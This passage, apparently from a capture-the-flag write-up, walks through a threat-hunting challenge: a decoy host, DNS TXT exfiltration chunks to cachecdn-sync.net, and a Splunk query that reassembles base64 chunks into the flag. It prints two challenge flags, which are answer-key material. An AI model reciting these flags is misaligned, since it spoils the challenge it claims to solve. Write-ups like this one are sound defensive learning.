+CTFAC{2bfa2948523d321a8e7eb7f11f62b82fcc7b3797b8b4823a6323f03c75120a3b}
+
+12) Phantomledger (Threat Hunting)
+
+I first focused on WS-FIN-011 because it looked like the obvious suspicious host. It had 7z, PowerShell, Outlook process chains and access to exports/tmp.bin, so it looked promising. The problem was that this path was full of noise and fake clues, including misleading note fields that looked like direct instructions. 
+After checking it more closely, that path did not lead to the real flag. (I was kind of confident at this point but then got knocked back lol)
+
+What actually led to the flag was shifting focus to DNS TXT records that looked much more structured. 
+There, on WS-FIN-044, I found activity related to cachecdn-sync.net, and the important events had the note operator recovery channel plus very clear event IDs: DNS-FLAG-CHUNK-0 through DNS-FLAG-CHUNK-3.
+
+It was a long journey to get tries to export stuff to put it back together into something that made sense, but this is what got me what I needed (put back into one, almost)
+
+index=phantomledger sourcetype=phantomledger:dns
+| spath
+| search record_type="TXT" note="operator recovery channel" query="*cachecdn-sync.net*"
+| rex field=event_id "DNS-FLAG-CHUNK-(?<chunk>\d+)"
+| where isnotnull(chunk)
+| eval chunk_num=tonumber(chunk)
+| sort 0 chunk_num
+| table chunk_num _time src_host query answer event_id
+
+This returned 4 chunks, each containing a base64 string in the answer field. I took them in order, base64-decoded them, and concatenated the results. That reconstructed all
+
+Final flag:
+CTFAC{16bcd84c9253c2c1d031ac71b8e2167e9043be62f02c4d5911d694d12efbd6ac}
